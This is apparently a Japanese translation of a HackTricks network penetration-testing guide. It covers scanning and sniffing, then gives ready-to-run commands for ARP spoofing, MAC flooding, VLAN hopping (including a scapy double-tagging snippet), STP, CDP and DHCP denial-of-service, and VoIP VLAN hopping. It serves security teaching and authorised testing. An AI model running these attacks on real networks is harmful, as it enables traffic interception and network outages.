# ネットワークのペンテスト

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **ハッカーによって作成されたプレミアムなバグバウンティプラットフォーム**である**Intigriti**に**サインアップ**してください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 外部からホストを発見する

これは、**インターネット**から**応答するIPアドレス**を見つける方法についての**簡単なセクション**です。\
この状況では、いくつかの**IPの範囲**（おそらく複数の**範囲**）があり、**どのIPが応答しているか**を見つけるだけです。

### ICMP

これは、ホストが起動しているかどうかを確認する**最も簡単で最も高速な方法**です。\
いくつかの**ICMP**パケットを送信して**応答を期待**することができます。最も簡単な方法は、**エコーリクエスト**を送信して応答を期待することです。単純な`ping`コマンドを使用するか、**範囲**を使用するために`fping`コマンドを使用することができます。\
また、**nmap**を使用して他のタイプのICMPパケットを送信することもできます（これにより、一般的なICMPエコーリクエスト-レスポンスのフィルタリングが回避されます）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCPポートの探索

あらゆる種類のICMPパケットがフィルタリングされていることは非常に一般的です。そのため、ホストが稼働しているかどうかを確認するためにできることは、**オープンポートを見つける**ことです。各ホストには**65535のポート**がありますので、もし「大規模な」スコープを持っている場合、各ホストの**すべてのポート**がオープンしているかどうかをテストすることはできません。それには時間がかかりすぎます。\
そのため、必要なのは**高速なポートスキャナー**（[masscan](https://github.com/robertdavidgraham/masscan)）と、**よりよく使用されるポートのリスト**です。
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
この手順は `nmap` を使用しても実行できますが、それは遅く、ホストを正確に識別する際に問題があります。

### HTTPポートの検出

これは、HTTPサービスの検出に焦点を当てたTCPポートの検出です。
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDPポートの探索

ホストに**特に注意を払うべきかどうか**を判断するために、**UDPポートが開いているかどうか**をチェックすることもできます。通常、UDPサービスは通常の空のUDPプローブパケットに対して**データを返さない**ため、ポートがフィルタリングされているのか開いているのかを判断するのは難しいです。これを判断する最も簡単な方法は、実行中のサービスに関連するパケットを送信することですが、実行中のサービスがわからないため、ポート番号に基づいて最も可能性の高いものを試す必要があります。
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
前に提案されたnmapの行は、/24の範囲内のすべてのホストで**上位1000のUDPポート**をテストしますが、これだけでも**20分以上**かかります。もっと**高速な結果**が必要な場合は、[**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)を使用できます: `./udp-proto-scanner.pl 199.66.11.53/24` これにより、これらの**UDPプローブ**が予想されるポートに送信されます（/24の範囲では1分で完了します）: _DNSStatusRequest、DNSVersionBindReq、NBTStat、NTPRequest、RPCCheck、SNMPv3GetRequest、chargen、citrix、daytime、db2、echo、gtpv1、ike、ms-sql、ms-sql-slam、netop、ntp、rpc、snmp-public、systat、tftp、time、xdmcp。_

### SCTPポートの検出
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifiのペンテスト

ここでは、執筆時点でよく知られているWifi攻撃の素晴らしいガイドを見つけることができます：

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 内部からホストを発見する

ネットワーク内部にいる場合、最初に行いたいことの一つは、**他のホストを発見する**ことです。**どれだけのノイズ**を出すことができるか/したいかによって、異なるアクションを実行することができます：

### パッシブ

これらのツールを使用して、接続されたネットワーク内のホストを受動的に発見することができます：
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### アクティブ

[_**外部からホストを発見する**_](./#discovering-hosts-from-the-outside)（TCP/HTTP/UDP/SCTPポートの発見）でコメントされているテクニックは、ここでも**適用できます**。\
ただし、他のホストと**同じネットワーク**にいるため、**さらに多くのこと**ができます。
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

注意してほしいのは、_Discovering hosts from the outside_ ([_**ICMP**_](./#icmp)) でコメントされているテクニックは、ここでも**適用できる**ということです。\
ただし、他のホストとは**同じネットワーク**にいるため、**さらに多くのこと**ができます。

* **サブネットのブロードキャストアドレス**に対して**ping**を送信すると、pingが**各ホスト**に到達し、彼らが**応答**することがあります: `ping -b 10.10.5.255`
* **ネットワークのブロードキャストアドレス**にpingを送信すると、**他のサブネット内のホスト**を見つけることもできます: `ping -b 255.255.255.255`
* `nmap`の`-PEPM`フラグを使用して、**ICMPv4 echo**、**timestamp**、および**subnet mask requests**を送信してホストの検出を実行することもできます: `nmap -PEPM -sP –vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lanは、**ネットワークメッセージ**を介してコンピュータを**起動**するために使用されます。コンピュータを起動するために使用されるマジックパケットは、単に**MAC Dst**が提供され、それが同じパケット内で**16回繰り返される**パケットです。\
そのため、この種のパケットは通常、**イーサネット0x0842**または**ポート9へのUDPパケット**で送信されます。\
**\[MAC]**が提供されない場合、パケットは**ブロードキャストイーサネット**に送信されます（ブロードキャストMACが繰り返されるものになります）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## ホストのスキャン

詳細にスキャンしたいすべてのIP（外部または内部）を発見したら、さまざまなアクションを実行できます。

### TCP

* **オープン**ポート： _SYN --> SYN/ACK --> RST_
* **クローズド**ポート： _SYN --> RST/ACK_
* **フィルタリングされた**ポート： _SYN --> \[NO RESPONSE]_
* **フィルタリングされた**ポート： _SYN --> ICMPメッセージ_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDPポートをスキャンするための2つのオプションがあります：

* ポートが**閉じている**場合、**UDPパケット**を送信し、応答が**ICMP unreachable**であるかどうかを確認します（いくつかの場合、ICMPは**フィルタリング**されるため、ポートが閉じているか開いているかの情報を受け取ることはありません）。
* 応答を引き出すために、**フォーマットされたデータグラム**を**サービス**（例：DNS、DHCP、TFTPなど、_nmap-payloads_にリストされている他のサービス）に送信します。応答を受け取った場合、ポートは**開いています**。

**Nmap**は、"-sV"を使用して両方のオプションを**組み合わせ**ます（UDPスキャンは非常に遅いです）。ただし、UDPスキャンはTCPスキャンよりも遅いことに注意してください：
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTPスキャン

SCTPはTCPとUDPと並んで存在します。IP上での**電話**データの**輸送**を提供することを目的としているこのプロトコルは、信号システム7（SS7）の信頼性機能の多くを複製し、SIGTRANとして知られる大規模なプロトコルファミリーの基盤となっています。SCTPは、IBM AIX、Oracle Solaris、HP-UX、Linux、Cisco IOS、およびVxWorksを含むオペレーティングシステムでサポートされています。

nmapでは、SCTPに対して2つの異なるスキャンが提供されています: _-sY_ と _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDSとIPSの回避

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **さらなるnmapオプション**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 内部IPアドレスの特定

設定ミスのあるルーター、ファイアウォール、およびネットワークデバイスは、ネットワークプローブに対して**非公開のソースアドレスを使用して応答する**ことがあります。テスト中に、_tcpdump_を使用して**プライベートアドレスから受信したパケットを特定**することができます。この場合、Kali Linuxの_eth2_インターフェースは**公共のインターネットからアクセス可能**です（もし**NAT**または**ファイアウォール**の**背後**にいる場合、この種のパケットはおそらく**フィルタリング**されます）。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## スニッフィング

スニッフィングを行うことで、キャプチャされたフレームやパケットを確認することで、IP範囲、サブネットのサイズ、MACアドレス、ホスト名の詳細を知ることができます。ネットワークが誤って設定されているか、スイッチングファブリックがストレス下にある場合、攻撃者は受動的なネットワークスニッフィングを通じて機密情報をキャプチャすることができます。

スイッチングイーサネットネットワークが適切に設定されている場合、ブロードキャストフレームとあなたのMACアドレス宛のデータのみが表示されます。

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
リアルタイムでGUIとしてWiresharkを使用して、SSHセッションを介してリモートマシンからパケットをキャプチャすることもできます。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercapは、ネットワークペネトレーションテストに使用される強力なツールです。このツールは、ネットワーク上のデバイスやクライアントのトラフィックを監視し、様々な攻撃手法を実行することができます。

Bettercapは、中間者攻撃やARPスプーフィングなどの攻撃手法をサポートしています。これにより、ネットワーク上の通信を傍受し、改ざんすることが可能です。

Bettercapは、コマンドラインインターフェースを提供しており、シンプルなコマンドを使用して攻撃を実行することができます。また、プラグインシステムを備えており、カスタム攻撃手法を追加することもできます。

Bettercapは、ネットワークの脆弱性を特定し、セキュリティの脆弱性をテストするための貴重なツールです。ただし、正当な目的でのみ使用することを強くお勧めします。
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

当然です。

### 資格情報のキャプチャ

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)のようなツールを使用して、pcapファイルまたはライブインターフェースから資格情報を解析することができます。

## LAN攻撃

### ARPスプーフィング

ARPスプーフィングは、自分のデバイスのMACアドレスを持つマシンのIPを示すために、不正なARP応答を送信することで構成されます。その後、被害者はARPテーブルを変更し、IPスプーフィングされた場合には常に私たちのマシンに連絡を取るようになります。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof（ARPスプーフィング）**

Arpspoofは、ネットワーク内でのARP（Address Resolution Protocol）スプーフィング攻撃を実行するためのツールです。ARPスプーフィングは、攻撃者がネットワーク上の他のデバイスに対して自身のMACアドレスを偽装することで、通信の中継や傍受を行う攻撃手法です。

このツールを使用すると、攻撃者はターゲットデバイスとゲートウェイ（ルーター）の間の通信を傍受することができます。これにより、攻撃者は通信内容を盗聴したり、改ざんしたりすることが可能になります。

Arpspoofは、ネットワーク内のデバイス間の通信を傍受するための有効な手法であり、ペンテストやセキュリティ監査の一環として使用されます。ただし、このツールを悪用することは違法行為となるため、正当な目的での使用に限定されます。
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAMオーバーフロー

スイッチのCAMテーブルをオーバーフローさせ、異なるソースMACアドレスを持つ多くのパケットを送信します。CAMテーブルがいっぱいになると、スイッチはハブのように振る舞い始めます（すべてのトラフィックをブロードキャストします）。
```bash
macof -i <interface>
```
現代のスイッチでは、この脆弱性は修正されています。

### 802.1Q VLAN / DTP 攻撃

#### ダイナミックトランキング

**DTP（Dynamic Trunking Protocol）**は、自動トランキングシステムを提供するために設計されたリンク層プロトコルです。DTPを使用すると、スイッチはどのポートがトランクモード（Trunk）で動作し、どのポートがそうでないかを決定します。**DTPの使用は、ネットワーク設計が不十分であることを示しています。**トランクは必要な場所に厳密に配置され、文書化されるべきです。

**デフォルトでは、すべてのスイッチポートはDynamic Autoモードで動作します。**これは、スイッチポートが隣接するスイッチからのトランク初期化モードであることを示しています。**ペンテスターはスイッチに物理的に接続し、DTP Desirableフレームを送信する必要があります**。これにより、ポートがトランクモードに切り替わります。攻撃者はSTPフレームの解析を使用してVLANを列挙し、仮想インターフェースを作成することでVLANセグメンテーションをバイパスすることができます。

多くのスイッチはデフォルトでDynamic Trunking Protocol（DTP）をサポートしていますが、これを悪用して**スイッチをエミュレートし、すべてのVLANを介してトラフィックを受信**することができます。ツール[_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)は、インターフェースをスニッフィングし、**スイッチがデフォルトモード、トランク、ダイナミック、オート、またはアクセスモードであるかを報告**します（これはVLANホッピングを回避する唯一のモードです）。ツールはスイッチが脆弱かどうかを示します。

ネットワークが脆弱であることが判明した場合、_**Yersinia**_を使用してプロトコル "**DTP**" を使用した "**enable trunking**" を実行し、すべてのVLANからのネットワークパケットを表示することができます。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

VLANを列挙するためには、スクリプト[DTPHijacking.py](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)を使用してDTPデザイアブルフレームを生成することも可能です。スクリプトを絶対に中断しないでください。スクリプトは3秒ごとにDTPデザイアブルを注入します。スイッチ上で動的に作成されたトランクチャネルは、5分間だけ存在します。5分後にトランクは解除されます。
```
sudo python3 DTPHijacking.py --interface eth0
```
私たちがSTPフレームを分析することで、VLAN 30とVLAN 60の存在を知ることができます。

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### 特定のVLANへの攻撃

VLANのIDとIP値がわかったら、特定のVLANに攻撃するために仮想インターフェースを設定することができます。\
DHCPが利用できない場合は、静的IPアドレスを設定するために_ifconfig_を使用してください。
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 自動VLANホッパー

**ダイナミックトランキングと仮想インターフェースの作成、他のVLAN内のホストの発見**という攻撃は、ツール[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)によって**自動的に実行**されます。

#### ダブルタギング

攻撃者が**被害者ホストのMAC、IP、VLAN IDの値を知っている**場合、指定されたVLANと被害者のVLANの両方を持つフレームに**ダブルタグを付けて**パケットを送信することができます。被害者は攻撃者との接続ができないため、攻撃者にとって**最良のオプションはUDPを介して通信する**ことです（SNMPのような興味深いアクションを実行できるプロトコル）。

攻撃者の別のオプションは、攻撃者が制御し、被害者がインターネットを介してアクセスできるIPをスプーフィングして**TCPポートスキャンを実行**することです。その後、攻撃者は自分が所有する2番目のホストでパケットを受信するかどうかをスニッフできます。

![](<../../.gitbook/assets/image (635) (1).png>)

この攻撃を実行するには、scapyを使用できます：`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### レイテンシャルVLANセグメンテーションバイパス <a href="#d679" id="d679"></a>

もし、**直接接続されたスイッチにアクセス権限がある**場合、ネットワーク内でのVLANセグメンテーションを**バイパスすることができます**。単にポートをトランクモード（またはトランク）に切り替え、ターゲットVLANのIDを持つ仮想インターフェースを作成し、IPアドレスを設定します。アドレスを動的に（DHCP）要求するか、静的に設定するかはケースによります。

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### レイヤー3プライベートVLANバイパス

ゲストワイヤレスネットワークやその他の環境では、プライベートVLAN（またはポートアイソレーションとも呼ばれる）設定が使用されています。これにより、ピア同士の相互作用が**防止されます**（つまり、クライアントは**ワイヤレスアクセスポイントに接続できますが、互いにアドレスを指定することはできません**）。ネットワークACL（またはそれがない場合）によっては、IPパケットをルーターに送信し、それが隣接するピアに転送される可能性があります。

この攻撃では、**クライアントのIPに対してルーターのMACを持つ特別に作成されたパケットを送信**します。その後、**ルーターはパケットをクライアントにリダイレクト**します。_ダブルタギング攻撃_と同様に、被害者によってアクセス可能なホストを制御することで、この脆弱性を悪用することができます。

### VTP攻撃

**VTP（VLANトランキングプロトコル）**は、VLANを一元管理するためのプロトコルです。スイッチは現在のVLANデータベースを追跡するために特別なリビジョン番号をチェックします。テーブルの更新が発生すると、リビジョン番号は1つ増加します。そして、スイッチがより高いリビジョン番号の設定を検出した場合、自動的にVLANデータベースを更新します。

#### VTPドメインの役割 <a href="#ebfc" id="ebfc"></a>

* **VTPサーバー**。VTPサーバーの役割を持つスイッチは、新しいVLANを作成したり、古いVLANを削除したり、VLAN自体の情報を変更したりすることができます。**また、ドメインの他のメンバーに対してVTPアナウンスを生成します。**
* **VTPクライアント**。この役割のスイッチは、ドメイン内の他のスイッチから特定のVTPアナウンスを受け取り、自身のVLANデータベースを更新します。クライアントはVLANを作成する能力に制限があり、VLANの設定をローカルで変更することは許可されていません。言い換えれば、**読み取り専用アクセス**です。
* **VTPトランスペアレント**。このモードでは、スイッチはVTPプロセスに参加せず、VLAN構成全体の完全なローカル管理をホストすることができます。トランスペアレントモードで動作している場合、スイッチは他のスイッチからのVTPアナウンスのみを送信し、VLAN構成には影響を与えません。**このようなスイッチのリビジョン番号は常にゼロであり、攻撃されることはありません。**

#### 広告タイプ <a href="#b384" id="b384"></a>

* **サマリ広告** - VTPサーバーが**300秒（5分）ごとに送信する**VTPアナウンスです。このアナウンスには、VTPドメイン名、プロトコルバージョン、タイムスタンプ、およびMD5構成ハッシュ値が格納されています。
* **サブセット広告** - VLAN構成の変更が発生するたびに送信されるVTP広告です。
* **広告リクエスト** - VTPクライアントからVTPサーバーへのサマリ広告メッセージのリクエストです。通常、スイッチがより高い構成リビジョン番号を持つサマリ広告を検出したメッセージに対して送信されます。

VTPは**トランクポートからのみ攻撃**を受けることができます。なぜなら、VTPアナウンスはトランクポートでのみブロードキャストおよび受信されるからです。**したがって、DTPへの攻撃後のペントestingでは、次のターゲットはVTPになる可能性があります。** VTPドメインを攻撃するためには、**Yersinia**を使用して**VTPインジェクトを実行**し、**VLANデータベース全体を消去**してネットワークを麻痺させることができます。

{% hint style="info" %}
VTPプロトコルには**3つのバージョン**があります。この記事では、最初のバージョンであるVTPv1に対する攻撃が行われています。
{% endhint %}
```bash
yersinia -G #For graphic mode
```
### STP攻撃

**インターフェースでBPDUフレームをキャプチャできない場合、STP攻撃は成功しない可能性が高いです。**

#### **STP BPDU DoS**

多くのBPDUs（Topology Change Notification）またはConf（トポロジが作成されるときに送信されるBPDUs）を送信すると、スイッチが過負荷になり、正しく動作しなくなります。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP 攻撃**

TCP を送信すると、スイッチの CAM テーブルは 15 秒で削除されます。その後、この種のパケットを連続して送信している場合、CAM テーブルは連続して再起動されます（または毎 15 秒ごとに再起動されます）。再起動されると、スイッチはハブのように振る舞います。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STPルート攻撃**

攻撃者は、スイッチの振る舞いをシミュレートしてネットワークのSTPルートになります。その結果、より多くのデータが攻撃者を経由します。これは、異なるスイッチに接続されている場合に興味深いです。\
これは、BPDUs CONFパケットを送信して、**優先度**値が実際のルートスイッチの優先度よりも低いと言います。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**もし攻撃者が2つのスイッチに接続されている場合、彼は新しいツリーのルートとなり、それらのスイッチ間のすべてのトラフィックは彼を経由します**（MITM攻撃が実行されます）。
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP攻撃

CISCO Discovery Protocolは、CISCOデバイスが相互に通信し、**誰が生きているか**、どのような機能を持っているかを検出するために使用されるプロトコルです。

#### 情報収集 <a href="#0e0f" id="0e0f"></a>

**デフォルトでは、CDPはすべてのポートにアナウンスを送信します。**しかし、もし侵入者が同じスイッチのポートに接続した場合はどうでしょうか？ネットワークスニッファー（Wireshark、tcpdump、Yersiniaなど）を使用して、彼はデバイス自体に関する**貴重な情報**を抽出することができます。モデルからCisco IOSのバージョンまでの情報を使用して、彼は同じバージョンのCisco IOSを列挙し、脆弱性を見つけてそれを悪用することができます。

#### CDPフラッディング攻撃 <a href="#0d6a" id="0d6a"></a>

実際のCISCOデバイスをシミュレートしてデバイスのメモリを枯渇させることで、CISCOスイッチにDoS攻撃を行うことができます。
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
**CDPテーブルのフラッディング**オプションを選択し、攻撃を開始します。スイッチのCPUおよびCDP隣接テーブルが過負荷となり、「ネットワークの麻痺」が発生します。

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDPなりすまし攻撃
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
また、[**scapy**](https://github.com/secdev/scapy/)を使用することもできます。`scapy/contrib`パッケージを使用してインストールしてください。

### VoIP攻撃

従業員のインターネット電話（VoIP）用に設計されているものの、現代のVoIPデバイスはますますIoTデバイスと統合されています。多くの従業員は特別な電話番号を使用してドアを開けたり、部屋の温度調節を制御したりすることができます...

ツール[**voiphopper**](http://voiphopper.sourceforge.net)は、Cisco、Avaya、Nortel、およびAlcatel-Lucentの環境でVoIP電話の動作を模倣します。サポートされているデバイス検出プロトコルの1つであるCisco Discovery Protocol（CDP）、Dynamic Host Configuration Protocol（DHCP）、Link Layer Discovery Protocol Media Endpoint Discovery（LLDP-MED）、および802.1Q ARPを使用して、音声ネットワークの正しいVLAN IDを自動的に検出します。

**VoIP Hopper**は**3つ**のCDPモードをサポートしています。**sniff**モードはネットワークパケットを検査し、VLAN IDを特定しようとします。使用するには、**`-c`**パラメータを`0`に設定します。**spoof**モードは、実際のVoIPデバイスが企業ネットワークで送信するのと似たカスタムパケットを生成します。使用するには、**`-c`**パラメータを**`1`**に設定します。**pre-madepacket**モードのスプーフは、Cisco 7971G-GE IP電話と同じパケットを送信します。使用するには、**`-c`**パラメータを**`2`**に設定します。

最後の方法を使用する理由は、最も高速なアプローチだからです。**`-i`**パラメータは攻撃者の**ネットワークインターフェース**を指定し、**`-E`**パラメータは模倣される**VOIPデバイスの名前**を指定します。私たちはCiscoのVoIP電話の命名形式と互換性のあるSEP001EEEEEEEEEという名前を選びました。この形式は、「SEP」という単語に続いてMACアドレスが続くものです。企業環境では、電話の背面にあるMACラベルを見て既存のVoIPデバイスを模倣することができます。または、電話のディスプレイ画面で設定ボタンを押し、モデル情報オプションを選択するか、VoIPデバイスのイーサネットケーブルをノートパソコンに接続し、Wiresharkを使用してデバイスのCDPリクエストを観察することによっても模倣することができます。
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
もしツールが正常に実行された場合、**VLANネットワークは攻撃者のデバイスにIPv4アドレスを割り当てます**。

### DHCP攻撃

#### 列挙
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoS（拒否サービス攻撃）**には2つのタイプがあります。最初のタイプは、**十分な数の偽のホストをシミュレートして、可能なすべてのIPアドレスを使用する**ことです。\
この攻撃は、DHCPサーバーの応答を見ることができ、プロトコルを完了できる場合にのみ機能します（**Discover**（Comp）-> **Offer**（server）-> **Request**（Comp）-> **ACK**（server））。たとえば、これは**Wifiネットワークでは不可能**です。

DHCP DoSを実行する別の方法は、**ソースコードとして可能なすべてのIPを使用してDHCP-RELEASEパケットを送信する**ことです。その後、サーバーはすべての人がIPを使用し終わったと思うでしょう。
